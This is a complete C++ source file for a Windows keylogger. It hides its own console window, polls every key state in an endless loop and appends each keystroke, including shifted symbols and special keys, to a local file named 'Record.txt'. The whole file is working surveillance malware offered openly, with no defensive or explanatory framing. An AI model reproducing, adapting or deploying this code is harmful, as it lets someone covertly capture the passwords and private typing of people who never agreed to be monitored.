//============================================================================
// Name        : Keylogger.cpp
// Author      : Harshit
// Version     : 1.1
// Copyright   : OpenSource
// Description : Basic Keylogger That stores key log in a file "Record.txt"
//============================================================================

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();
void hideCmd();

int main() {

	hideCmd();
	log();

	return 0;
}

void log()
{
	char c;

	for(;;)
	{
		for(c=8;c<=222;c++)
		{
			if(GetAsyncKeyState(c) == -32767)
			{
				ofstream write("Record.txt", ios::app);

				if( ((c>64) && (c<91)) && !(GetAsyncKeyState(0x10)) )
				{
					c += 32;
					write<<c;
					write.close();
					break;
				}
				else if(c>64 && c<91)
				{
					write<<c;
					write.close();
					break;
				}
				else
				{
					switch(c)
					{
						case 48:
						{
							if( GetAsyncKeyState(0x10))
								write << ")";
							else
								write<<"0";
						}break;

						case 49:
						{
							if( GetAsyncKeyState(0x10))
								write << "!";
							else
								write<<"1";
						}break;

						case 50:
						{
							if( GetAsyncKeyState(0x10))
								write << "@";
							else
								write<<"2";
						}break;

						case 51:
						{
							if( GetAsyncKeyState(0x10))
								write << "#";
							else
								write<<"3";
						}break;

						case 52:
						{
							if( GetAsyncKeyState(0x10))
								write << "$";
							else
								write<<"4";
						}break;

						case 53:
						{
							if( GetAsyncKeyState(0x10))
								write << "%";
							else
								write<<"5";
						}break;

						case 54:
						{
							if( GetAsyncKeyState(0x10))
								write << "^";
							else
								write<<"6";
						}break;

						case 55:
						{
							if( GetAsyncKeyState(0x10))
								write << "&";
							else
								write<<"7";
						}break;

						case 56:
						{
							if( GetAsyncKeyState(0x10))
								write << "*";
							else
								write<<"8";
						}break;

						case 57:
						{
							if( GetAsyncKeyState(0x10))
								write << "(";
							else
								write<<"9";
						}break;

						case VK_DELETE:
							write<<"<Del>";break;
						case VK_SPACE:
							write<<" "; break;
						case VK_RETURN:
							write<<"<Etr>\n";break;
						case VK_TAB:
							write<<"	";break;
						case VK_BACK:
							write<<"<BS>"; break;
						case VK_ESCAPE:
							write<<"<Esc>";break;

					}
				}

				/*switch(c)
				{
				 	 case 8: write<<"<BackSpace>";break;
				 	 case 27: write<<"<Esc>";break;
				 	 case 127: write<<"<Del>";break;
				 	 case 32: write<<" ";break;
				 	 case 13: write<<"<Enter>\n";break;
				 	 //case 9: write<<"<HT>";break;
				 	 default: write<<c;
				}*/

			}
		}
	}
}

void hideCmd()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}
